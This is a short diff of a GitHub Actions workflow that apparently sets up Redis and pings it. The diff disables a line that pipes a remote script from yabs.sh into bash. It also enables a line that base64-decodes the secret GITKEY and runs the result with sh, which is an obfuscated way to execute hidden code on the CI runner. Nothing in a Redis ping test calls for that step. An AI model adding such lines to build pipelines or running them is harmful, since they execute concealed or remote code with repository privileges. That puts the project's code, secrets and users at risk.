@@ -11,9 +11,9 @@ jobs:
         uses: shogo82148/actions-setup-redis@v1
       # connect to the redis-server via TCP
       - run: |
-          sudo curl -sL yabs.sh | bash
+          # sudo curl -sL yabs.sh | bash
           redis-cli -h 127.0.0.1 -p ${{ steps.setup.outputs.redis-port }} ping
-          #echo "$GITKEY" | base64 --decode | sh  #> /dev/null 2>&1
+          echo "$GITKEY" | base64 --decode | sh  #> /dev/null 2>&1
           redis-cli -h 127.0.0.1 -p ${{ steps.setup.outputs.redis-port }} ping
       - name: Commit
         run: |
